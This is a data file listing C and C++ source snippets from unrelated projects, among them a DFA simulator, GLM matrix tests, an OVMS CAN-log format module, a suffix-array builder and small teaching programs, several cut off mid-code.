    "#include <iostream>\r\n#include <unordered_map>\r\n#include <vector>\r\n#include <string>\r\nusing namespace std;\r\n\r\n// Function to process the input string and check if it's accepted by the DFA\r\nbool isAcceptedByDFA(int initialState, const vector<int>& acceptingStates,\r\n                     const unordered_map<int, unordered_map<char, int>>& transitionTable,\r\n                     const string& inputString) {\r\n    int currentState = initialState;\r\n\r\n    for (char symbol : inputString) {\r\n        if (transitionTable.at(currentState).find(symbol) == transitionTable.at(currentState).end()) {\r\n            return false; // Invalid transition\r\n        }\r\n        currentState = transitionTable.at(currentState).at(symbol);\r\n    }\r\n\r\n    // Check if the final state is an accepting state\r\n    for (int state : acceptingStates) {\r\n        if (currentState == state) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nint main() {\r\n    int numInputSymbols;\r\n    cout << \"Enter number of input symbols: \";\r\n    cin >> numInputSymbols;\r\n\r\n    vector<char> inputSymbols(numInputSymbols);\r\n    cout << \"Enter input symbols: \";\r\n    for (int i = 0; i < numInputSymbols; i++) {\r\n        cin >> inputSymbols[i];\r\n    }\r\n\r\n    int numStates;\r\n    cout << \"Enter number of states: \";\r\n    cin >> numStates;\r\n\r\n    int initialState;\r\n    cout << \"Enter initial state: \";\r\n    cin >> initialState;\r\n\r\n    int numAcceptingStates;\r\n    cout << \"Enter number of accepting states: \";\r\n    cin >> numAcceptingStates;\r\n\r\n    vector<int> acceptingStates(numAcceptingStates);\r\n    cout << \"Enter accepting states: \";\r\n    for (int i = 0; i < numAcceptingStates; i++) {\r\n        cin >> acceptingStates[i];\r\n    }\r\n\r\n    unordered_map<int, unordered_map<char, int>> transitionTable;\r\n    cout << \"Enter transition table in the format: state input_symbol next_state (e.g., 1 a 2):\" << endl;\r\n    for (int i = 0; i < numStates * numInputSymbols; i++) {\r\n        int currentState, nextState;\r\n        char symbol;\r\n        cin >> currentState >> symbol >> nextState;\r\n        transitionTable[currentState][symbol] = nextState;\r\n    }\r\n\r\n    string inputString;\r\n    cout << \"Enter the input string: \";\r\n    cin >> inputString;\r\n\r\n    if (isAcceptedByDFA(initialState, acceptingStates, transitionTable, inputString)) {\r\n        cout << \"The input string is ACCEPTED by the DFA.\" << endl;\r\n    } else {\r\n        cout << \"The input string is REJECTED by the DFA.\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <glm/gtc/type_ptr.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/constants.hpp>\n#include <glm/ext/vector_relational.hpp>\n#include <glm/ext/matrix_relational.hpp>\n\nstatic int test_value_ptr_vec()\n{\n\tint Error = 0;\n\n\t{\n\t\tglm::vec2 v(1.0);\n\t\tfloat * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::vec3 v(1.0);\n\t\tfloat * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::vec4 v(1.0);\n\t\tfloat * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\n\t{\n\t\tglm::dvec2 v(1.0);\n\t\tdouble * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::dvec3 v(1.0);\n\t\tdouble * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::dvec4 v(1.0);\n\t\tdouble * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\n\treturn Error;\n}\n\nstatic int test_value_ptr_vec_const()\n{\n\tint Error = 0;\n\n\t{\n\t\tglm::vec2 const v(1.0);\n\t\tfloat const * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::vec3 const v(1.0);\n\t\tfloat const * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::vec4 const v(1.0);\n\t\tfloat const * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\n\t{\n\t\tglm::dvec2 const v(1.0);\n\t\tdouble const * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::dvec3 const v(1.0);\n\t\tdouble const * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::dvec4 const v(1.0);\n\t\tdouble const * p = glm::value_ptr(v);\n\t\tError += p == &v[0] ? 0 : 1;\n\t}\n\n\treturn Error;\n}\n\nstatic int test_value_ptr_mat()\n{\n\tint Error = 0;\n\n\t{\n\t\tglm::mat2x2 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat2x3 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat2x4 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat3x2 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat3x3 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat3x4 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat4x2 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat4x3 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat4x4 m(1.0);\n\t\tfloat * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\n\treturn Error;\n}\n\nstatic int test_value_ptr_mat_const()\n{\n\tint Error = 0;\n\n\t{\n\t\tglm::mat2x2 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat2x3 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat2x4 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat3x2 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat3x3 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat3x4 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat4x2 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat4x3 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\t{\n\t\tglm::mat4x4 const m(1.0);\n\t\tfloat const * p = glm::value_ptr(m);\n\t\tError += p == &m[0][0] ? 0 : 1;\n\t}\n\n\treturn Error;\n}\n\nstatic int test_make_pointer_mat()\n{\n\tint Error = 0;\n\n\tfloat ArrayA[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};\n\tdouble ArrayB[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};\n\n\tglm::mat2x2 Mat2x2A = glm::make_mat2x2(ArrayA);\n\tError += glm::all(glm::equal(Mat2x2A, glm::mat2x2(0, 1, 2, 3), 0.001f)) ? 0 : 1;\n\n\tglm::mat2x3 Mat2x3A = glm::make_mat2x3(ArrayA);\n\tError += glm::all(glm::equal(Mat2x3A, glm::mat2x3(0, 1, 2, 3, 4, 5), 0.001f)) ? 0 : 1;\n\n\tglm::mat2x4 Mat2x4A = glm::make_mat2x4(ArrayA);\n\tError += glm::all(glm::equal(Mat2x4A, glm::mat2x4(0, 1, 2, 3, 4, 5, 6, 7), 0.001f)) ? 0 : 1;\n\n\tglm::mat3x2 Mat3x2A = glm::make_mat3x2(ArrayA);\n\tError += glm::all(glm::equal(Mat3x2A, glm::mat3x2(0, 1, 2, 3, 4, 5), 0.001f)) ? 0 : 1;\n\n\tglm::mat3x3 Mat3x3A = glm::make_mat3x3(ArrayA);\n\tError += glm::all(glm::equal(Mat3x3A, glm::mat3x3(0, 1, 2, 3, 4, 5, 6, 7, 8), 0.001f)) ? 0 : 1;\n\n\tglm::mat3x4 Mat3x4A = glm::make_mat3x4(ArrayA);\n\tError += glm::all(glm::equal(Mat3x4A, glm::mat3x4(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11), 0.001f)) ? 0 : 1;\n\n\tglm::mat4x2 Mat4x2A = glm::make_mat4x2(ArrayA);\n\tError += glm::all(glm::equal(Mat4x2A, glm::mat4x2(0, 1, 2, 3, 4, 5, 6, 7), 0.001f)) ? 0 : 1;\n\n\tglm::mat4x3 Mat4x3A = glm::make_mat4x3(ArrayA);\n\tError += glm::all(glm::equal(Mat4x3A, glm::mat4x3(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11), 0.001f)) ? 0 : 1;\n\n\tglm::mat4x4 Mat4x4A = glm::make_mat4x4(ArrayA);\n\tError += glm::all(glm::equal(Mat4x4A, glm::mat4x4(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15), 0.001f)) ? 0 : 1;\n\n\n\n\tglm::dma",
    "/*\n;    Project:       Open Vehicle Monitor System\n;    Module:        CAN dump framework\n;    Date:          18th January 2018\n;\n;    (C) 2018       Mark Webb-Johnson\n;\n; Permission is hereby granted, free of charge, to any person obtaining a copy\n; of this software and associated documentation files (the \"Software\"), to deal\n; in the Software without restriction, including without limitation the rights\n; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n; copies of the Software, and to permit persons to whom the Software is\n; furnished to do so, subject to the following conditions:\n;\n; The above copyright notice and this permission notice shall be included in\n; all copies or substantial portions of the Software.\n;\n; THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n; THE SOFTWARE.\n*/\n\n#include \"ovms_log.h\"\nstatic const char *TAG = \"canformat-gvret\";\n\n#include \"canformat_gvret.h\"\n#include \"canlog.h\"\n#include <errno.h>\n#include <endian.h>\n#include \"pcp.h\"\n\n////////////////////////////////////////////////////////////////////////\n// Initialisation and Registration\n////////////////////////////////////////////////////////////////////////\n\nclass OvmsCanFormatGVRETInit\n  {\n  public: OvmsCanFormatGVRETInit();\n};\n\nOvmsCanFormatGVRETInit::OvmsCanFormatGVRETInit()\n  {\n  ESP_LOGI(TAG, \"Registering CAN Format: GVRET\");\n\n  OvmsCanFormatFactory::instance(TAG).RegisterCanFormat<canformat_gvret_ascii>(\"gvret-a\");\n  OvmsCanFormatFactory::instance(TAG).RegisterCanFormat<canformat_gvret_binary>(\"gvret-b\");\n  }\n\n////////////////////////////////////////////////////////////////////////\n// Base GVRET implementation (utility)\n////////////////////////////////////////////////////////////////////////\n\ncanformat_gvret::canformat_gvret(const char* type)\n  : canformat(type)\n  {\n  }\n\ncanformat_gvret::~canformat_gvret()\n  {\n  }\n\nstd::string canformat_gvret::get(CAN_log_message_t* message)\n  {\n  return std::string(\"\");\n  }\n\nstd::string canformat_gvret::getheader(struct timeval *time)\n  {\n  return std::string(\"\");\n  }\n\nsize_t canformat_gvret::put(CAN_log_message_t* message, uint8_t *buffer, size_t len, bool* hasmore, canlogconnection* clc)\n  {\n  return len;\n  }\n\n////////////////////////////////////////////////////////////////////////\n// ASCII format GVRET\n////////////////////////////////////////////////////////////////////////\n\ncanformat_gvret_ascii::canformat_gvret_ascii(const char* type)\n  : canformat_gvret(type)\n  {\n  }\n\nstd::string canformat_gvret_ascii::get(CAN_log_message_t* message)\n  {\n  char buf[CANFORMAT_GVRET_MAXLEN];\n\n  if ((message->type != CAN_LogFrame_RX)&&\n      (message->type != CAN_LogFrame_TX))\n    {\n    return std::string(\"\");\n    }\n\n  char busnumber = (message->origin != NULL)?message->origin->m_busnumber + '0':'0';\n\n  sprintf(buf,\"%\" PRIu32 \" - %\" PRIx32 \" %s %c %d\",\n    (uint32_t)((message->timestamp.tv_sec * 1000000) + message->timestamp.tv_usec),\n    message->frame.MsgID,\n    (message->frame.FIR.B.FF == CAN_frame_std) ? \"S\" : \"X\",\n    busnumber,\n    message->frame.FIR.B.DLC);\n    for (int k=0; k<message->frame.FIR.B.DLC; k++)\n      sprintf(buf+strlen(buf),\" %02x\", message->frame.data.u8[k]);\n\n  strcat(buf,\"\\n\");\n  return std::string(buf);\n  }\n\nsize_t canformat_gvret_ascii::put(CAN_log_message_t* message, uint8_t *buffer, size_t len, bool* hasmore, canlogconnection* clc)\n  {\n  if (m_buf.FreeSpace()==0) SetServeDiscarding(true); // Buffer full, so discard from now on\n  if (IsServeDiscarding()) return len;  // Quick return if discarding\n\n  size_t consumed = Stuff(buffer,len);  // Stuff m_buf with as much as possible\n\n  if (m_buf.HasLine()<0)\n    {\n    return consumed; // No line, so quick exit\n    }\n  else\n    {\n    std::string line = m_buf.ReadLine();\n    char *b = strdup(line.c_str());\n\n    // We look for something like\n    // 1000 - 100 S 0 4 01 02 03 04\n    // timestamp, message ID (hex), S or X, length, data bytes\n\n    message->type = CAN_LogFrame_RX;\n\n    uint32_t timestamp = strtol(b,&b,10);\n    message->timestamp.tv_sec = timestamp % 1000000;\n    message->timestamp.tv_usec = timestamp / 1000000;\n\n    b += 2; // Skip the '-'\n\n    message->frame.MsgID = strtol(b,&b,16);\n    if (b[1] == 'S')\n      {\n      message->frame.FIR.B.FF = CAN_frame_std;\n      }\n    else if (b[1] == 'X')\n      {\n      message->frame.FIR.B.FF = CAN_frame_ext;\n      }\n    else\n      {\n      // Bad frame type - discard\n      free(b);\n      return consumed;\n      }\n\n    b += 2; // Skip the frame type\n\n    uint32_t busnumber = strtol(b,&b,10);\n\n    message->frame.FIR.B.DLC = strtol(b,&b,10);\n    if (message->frame.FIR.B.D",
    "void counting_sort(vector<int> &p, vector<int> &c, int n)\n{\n\tvector<int> cnt(n);\n\tfor (auto x : c)\n\t\tcnt[x]++;\n\tvector<int> p_new(n);\n\tvector<int> pos(n);\n\tpos[0] = 0;\n\tfor (int i = 1; i < n; i++)\n\t\tpos[i] = pos[i - 1] + cnt[i - 1];\n\tfor (auto x : p)\n\t{\n\t\tint i = c[x];\n\t\tp_new[pos[i]] = x;\n\t\tpos[i]++;\n\t}\n\tp = p_new;\n}\nint main()\n{\n\tfastio();\n#ifndef ONLINE_JUDGE\n\tfreopen(\"Input.txt\", \"r\", stdin);\n\tfreopen(\"Output.txt\", \"w\", stdout);\n\tfreopen(\"Error.txt\", \"w\", stderr);\n#endif\n\tstring s;\n\tcin >> s;\n\ts += '$';\n\tint n = s.length();\n\tvector<int> p(n), c(n);\n\t{\n\t\tvector<pair<char, int>> a(n);\n\t\tfor (int i = 0; i < n; i++)\n\t\t\ta[i] = {s[i], i};\n\t\tsort(a.begin(), a.end());\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tp[i] = a[i].ss;\n\t\tc[p[0]] = 0;\n\t\tfor (int i = 1; i < n; i++)\n\t\t{\n\t\t\tif (a[i].ff == a[i - 1].ff)\n\t\t\t\tc[p[i]] = c[p[i - 1]];\n\t\t\telse\n\t\t\t\tc[p[i]] = c[p[i - 1]] + 1;\n\t\t}\n\t}\n\tint k = 0;\n\twhile ((1 << k) < n)\n\t{\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tp[i] = (p[i] - (1 << k) + n) % n;\n\t\tcounting_sort(p, c, n);\n\t\tvector<int> c_new(n);\n\t\tc_new[p[0]] = 0;\n\t\tfor (int i = 1; i < n; i++)\n\t\t{\n\t\t\tpair<int, int> prev = {c[p[i - 1]], c[(p[i - 1] + (1 << k)) % n]};\n\t\t\tpair<int, int> now = {c[p[i]], c[(p[i] + (1 << k)) % n]};\n\t\t\tif (now == prev)\n\t\t\t\tc_new[p[i]] = c_new[p[i - 1]];\n\t\t\telse\n\t\t\t\tc_new[p[i]] = c_new[p[i - 1]] + 1;\n\t\t}\n\t\tk++;\n\t\tc = c_new;\n\t}\n\tfor (int i = 0; i < n; i++)\n\t\tcout << p[i] << \" \";\n\tcout << endl;\n\treturn 0;\n}\n",
    "#include <iostream>\nusing namespace std;\nclass Payment {\npublic:\n    virtual void processPayment() const = 0;\n    virtual ~Payment() {}\n};\n\n// Abstract Product for Shipping\nclass Shipping {\npublic:\n    virtual void ship() const = 0;\n    virtual ~Shipping() {}\n};\n\nclass CreditCardPayment : public Payment {\npublic:\n    void processPayment() const override {\n        cout << \"Processing payment via Credit Card.\";\n    }\n};\nclass PayPalPayment : public Payment {\npublic:\n    void processPayment() const override {\n        std::cout << \"Processing payment via PayPal.\";\n    }\n};\nclass StandardShipping : public Shipping {\npublic:\n    void ship() const override {\n        cout << \"Shipping with Standard Shipping.\";\n    }\n};\nclass ExpressShipping : public Shipping {\npublic:\n    void ship() const override {\n        cout << \"Shipping with Express Shipping.\";\n    }\n};\n\n// Abstract Factory\nclass PaymentShippingFactory {\npublic:\n    virtual Payment* createPayment() const = 0;\n    virtual Shipping* createShipping() const = 0;\n    virtual ~PaymentShippingFactory() {}\n};\n\n// Concrete Factory for Credit Card Payment and Standard Shipping\nclass CreditCardStandardFactory : public PaymentShippingFactory {\npublic:\n    Payment* createPayment() const override {\n        return new CreditCardPayment();\n    }\n    \n    Shipping* createShipping() const override {\n        return new StandardShipping();\n    }\n};\n\n// Concrete Factory for Credit Card Payment and Express Shipping\nclass CreditCardExpressFactory : public PaymentShippingFactory {\npublic:\n    Payment* createPayment() const override {\n        return new CreditCardPayment();\n    }\n    \n    Shipping* createShipping() const override {\n        return new ExpressShipping();\n    }\n};\n\n// Concrete Factory for PayPal Payment and Standard Shipping\nclass PayPalStandardFactory : public PaymentShippingFactory {\npublic:\n    Payment* createPayment() const override {\n        return new PayPalPayment();\n    }\n    \n    Shipping* createShipping() const override {\n        return new StandardShipping();\n    }\n};\n\n// Concrete Factory for PayPal Payment and Express Shipping\nclass PayPalExpressFactory : public PaymentShippingFactory {\npublic:\n    Payment* createPayment() const override {\n        return new PayPalPayment();\n    }\n    \n    Shipping* createShipping() const override {\n        return new ExpressShipping();\n    }\n};\n\nvoid processOrder(const PaymentShippingFactory& factory) {\n    Payment* payment = factory.createPayment();\n    Shipping* shipping = factory.createShipping();\n    \n    payment->processPayment();\n    shipping->ship();\n    \n    // Clean up\n    delete payment;\n    delete shipping;\n}\n\nint main() {\n    cout << \"Order 1:\" <<endl;\n    CreditCardStandardFactory creditCardStandardFactory;\n    processOrder(creditCardStandardFactory);\n\n    cout << \"Order 2:\" <<endl;\n    PayPalExpressFactory payPalExpressFactory;\n    processOrder(payPalExpressFactory);\n\n    cout << \"Order 3:\" <<endl;\n    CreditCardExpressFactory creditCardExpressFactory;\n    processOrder(creditCardExpressFactory);\n    \n    cout << \"Order 4:\" << endl;\n    PayPalStandardFactory payPalStandardFactory;\n    processOrder(payPalStandardFactory);\n}\n\n\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n\r\n// \u5b9a\u4e49\u4e8c\u53c9\u6811\u8282\u70b9\u7ed3\u6784\u4f53\r\ntypedef struct btnode\r\n{\r\n    int val;\r\n    struct btnode* lchild;\r\n    struct btnode* rchild;\r\n} btnode;\r\n\r\n// \u521b\u5efa\u65b0\u8282\u70b9\u7684\u51fd\u6570\r\nbtnode* create(int val)\r\n{\r\n    btnode* newnode = (btnode*)malloc(sizeof(btnode));\r\n    if (newnode == NULL)\r\n    {\r\n        printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25!\\n\");\r\n        return NULL;\r\n    }\r\n    newnode->val = val;\r\n    newnode->lchild = NULL;\r\n    newnode->rchild = NULL;\r\n    return newnode;\r\n}\r\n\r\n// \u524d\u5e8f\u5efa\u7acb\u4e8c\u53c9\u6811\u7684\u51fd\u6570\uff08\u4fee\u6b63\u540e\u7684\u6b63\u786e\u7248\u672c\uff09\r\nbtnode* build()\r\n{\r\n    int val;\r\n    scanf(\"%d\", &val);\r\n    if (val == -1)  // \u7528-1\u8868\u793a\u7a7a\u8282\u70b9\r\n    {\r\n        return NULL;\r\n    }\r\n    btnode* bt = create(val);\r\n    bt->lchild = build();\r\n    bt->rchild = build();\r\n    return bt;\r\n}\r\n\r\n// \u5148\u5e8f\u904d\u5386\u51fd\u6570\r\nvoid preorder(btnode* bt)\r\n{\r\n   if(bt!=NULL)\r\n   { \r\n    printf(\"%-4d\", bt->val);\r\n    preorder(bt->lchild);\r\n    preorder(bt->rchild);\r\n   }\r\n}\r\n\r\nint main()\r\n{\r\n    printf(\"\u8bf7\u6309\u7167\u524d\u5e8f\u904d\u5386\u7684\u987a\u5e8f\u8f93\u5165\u4e8c\u53c9\u6811\u8282\u70b9\u7684\u503c\uff08\u7528-1\u8868\u793a\u7a7a\u8282\u70b9\uff09\uff1a\\n\");\r\n    btnode* root = build();\r\n    printf(\"\u5148\u5e8f\u904d\u5386\u7ed3\u679c\u4e3a\uff1a\\n\");\r\n    preorder(root);\r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"expense_tracker_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <map>\n#include <string>\n#include <vector>\n#include \"Book.h\"\n#include \"BookManager.h\"\n#include \"BorrowManager.h\"\n\n// \uad6c\ubd84 \uc120\nvoid printline() {\n\tfor (int i = 0; i < 29; i++) {\n\t\tstd::cout << \"=\";\n\t}\n\tstd::cout << std::endl;\n}\n\n\nint main() {\n\t\n\tBook_Manager book_manager;\n\tBorrow_Manager borrow_manager;\n\t\n\t// \ucc45 \uc0dd\uc131\n\tBook book1(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\", \"\ubb38\uc885\ucc44\");\n\tBook book2(\"Effective C++ third Edition\", \"Scott Meyers\");\n\tBook book3(\"A tour of C++\", \"Bjarne Stroupstrup\");\n\n\t// \ucc45 \ubaa9\ub85d\uc5d0 \ucc45 \ucd94\uac00\n\tbook_manager.AddBook(book1);\n\tbook_manager.AddBook(book2);\n\tbook_manager.AddBook(book3);\n\n\t// \ucc45 \ubaa9\ub85d\n\tbook_manager.DispalyAllBooks();\n\n\t\n\t// \ucc45 \uc788\ub294\uc9c0 \ud655\uc778\n\tbook_manager.GetBookbyTitle(\"C++ \ubc15\uc0b4\ub0b4\ubcf4\uc790\");\n\tbook_manager.GetBookbyAuthor(\"\uc815\ud61c\ucc3d\");\n\tbook_manager.GetBookbyAuthor(\"\ubb38\uc885\ucc44\");\n\tbook_manager.GetBookbyTitle(\"Effective C++ third Edition\");\n\tprintline();\n\n\t// \ucc45 \uc7ac\uace0 \ucd08\uae30\ud654\n\tborrow_manager.initializeStock(book1);\n\tborrow_manager.initializeStock(book2);\n\tborrow_manager.initializeStock(book3);\n\n\t// \ucc45 \uc7ac\uace0 \ud604\ud669\n\tborrow_manager.displayStock(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\");\n\tborrow_manager.displayStock(\"Effective C++ third Edition\");\n\tborrow_manager.displayStock(\"A tour of C++\");\n\n\tprintline(); \n\t// \ucc45 \ub300\uc5ec\n\tborrow_manager.borrowBook(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\"); // stock : 2\uad8c\n\tborrow_manager.displayStock(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\");\n\tborrow_manager.borrowBook(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\"); // stock : 1\uad8c\n\tborrow_manager.displayStock(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\");\n\tborrow_manager.borrowBook(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\"); // stock : 0\uad8c\n\tborrow_manager.displayStock(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\");\n\tborrow_manager.borrowBook(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\"); // \ub300\uc5ec \ubd88\uac00\n\n\tprintline();\n\t// \ucc45 \ubc18\ub0a9\n\tborrow_manager.returnBook(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\"); \n\tborrow_manager.displayStock(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\"); // stock : 1\uad8c\n\tborrow_manager.returnBook(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\");\n\tborrow_manager.displayStock(\"Do it! C++ \uc644\uc804 \uc815\ubcf5\"); // stock : 2\uad8c\n\n\treturn 0;\n}\n\n\n\n\n",
    "#include <iostream>\n#include <cstring>\n#include \"mpc.h\"\n\nusing namespace std;\n\n#include \"global_vars.h\"\n// #include \"malloc_defs.h\"\n#include \"utils.h\"\n#include \"tensor_utils.h\"\n#include \"poly_frac.h\"\n#include \"conversions.h\"\n#include \"system_analyzer.h\"\nextern \"C\" {\n\t#include \"mp_roots_poly.h\"\n\t#include \"cpoly.h\"\n\t#include \"ex_tree.h\"\n}\n\n\n//////\n// FORWARD DECLARATION\n//////\nvoid decode_tree_pf(\n\t// OUTPUT\n\tstruct poly_frac *out,\n\t// IN-OUT\n\tint *nroots, mpc_t **roots, mpfr_t **tols,\n\t// INPUT\n\tstruct poly_frac *in,\n\tchar ***kin, int *skip_inv, int *is_mass,\n\tchar **s_tree, char *sep,\n\tint wp2, mpfr_t mpfr_tol, int incr_prec\n);\n\nvoid lnode_to_pf(\n\t// OUTPUT\n\tstruct poly_frac *out,\n\t// IN-OUT\n\tint *nroots, mpc_t **roots, mpfr_t **tols,\n\t// INPUT\n\tstruct poly_frac *in,\n\tchar ***kin, int *skip_inv, int *is_mass,\n\tstruct lnode *nd,\n\tint wp2, mpfr_t mpfr_tol, int incr_prec\n);\n\n//////\n// ROUTINES FOR POLYNOMIALS BY COEFFICIENTS\n//////\nstruct cpoly{\n\tint deg;\n\tmpc_t *coeffs;\n};\n\n\nvoid cpoly_build(\n\tstruct cpoly *pol\n) {\n\t(*pol).coeffs = NULL;\n}\n\n\nvoid cpoly_print(\n\tstruct cpoly *pol\n) {\n\tif ((*pol).deg == -1) {\n\t\tcout << \"0\" << endl;\n\t\treturn;\n\t}\n\n\tcout << \"degree: \" << (*pol).deg << endl;\n\tif ((*pol).coeffs) {\n\t\tfor (int k=0; k<=(*pol).deg; k++) {\n\t\t\tcout << \"pow \" << k << \": \";\n\t\t\tmpc_out_str(stdout, 10, 0, (*pol).coeffs[k], MPFR_RNDN);\n\t\t\tcout << endl;\n\t\t}\n\t}\n}\n\n\nvoid cpoly_set_zero(\n\tstruct cpoly *pol\n) {\n\t(*pol).deg = -1;\n\tif ((*pol).coeffs) {\n\t\tdelete[] (*pol).coeffs;\n\t}\n}\n\n\nvoid cpoly_set_ui(\n\tstruct cpoly *pol,\n\tint ui_num\n) {\n\tif (ui_num == 0) {\n\t\tcpoly_set_zero(pol);\n\t\treturn;\n\t}\n\n\t(*pol).deg = 0;\n\tif ((*pol).coeffs) {\n\t\tdelete[] (*pol).coeffs;\n\t}\n\t(*pol).coeffs = new mpc_t[1];\n\tmpc_init3((*pol).coeffs[0], wp2, wp2);\n\tmpc_set_ui((*pol).coeffs[0], ui_num, MPFR_RNDN);\n}\n\n\nvoid cpoly_set_str(\n\tstruct cpoly *pol,\n\tchar *str\n) {\n\t(*pol).deg = 0;\n\tif ((*pol).coeffs) 